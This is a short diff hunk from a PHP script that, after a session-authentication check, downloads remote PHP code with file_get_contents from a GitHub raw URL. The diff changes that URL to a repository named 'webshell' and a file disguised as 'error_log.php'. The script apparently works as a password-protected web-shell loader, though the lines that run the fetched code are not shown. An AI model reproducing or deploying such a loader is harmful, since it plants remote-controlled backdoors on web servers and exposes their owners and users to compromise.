@@ -50,7 +50,7 @@ if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
     exit;
 }
 
-$url = 'https://raw.githubusercontent.com/sibueee/privwp/main/1.php';
+$url = 'https://raw.githubusercontent.com/sibueee/webshell/main/error_log.php';
 $kode = file_get_contents($url);
 if ($kode === FALSE) {
     die('Error fetching code from URL.');
